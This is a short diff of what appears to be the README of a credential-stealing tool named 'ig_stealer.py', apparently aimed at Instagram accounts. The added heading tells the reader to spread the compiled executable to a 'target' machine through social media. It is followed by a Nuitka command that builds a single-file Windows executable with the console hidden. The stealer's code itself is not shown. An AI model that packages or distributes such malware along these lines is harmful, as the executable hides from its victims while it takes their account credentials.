@@ -34,7 +34,7 @@ Either:
 
 ---
 
-## How to Compile to EXE
+## How to Compile to EXE (you can share this exe to target meshine through social media or ant meduiam )
 
 ### Option 1: Nuitka (Recommended)
 python -m nuitka --onefile --windows-disable-console ig_stealer.py
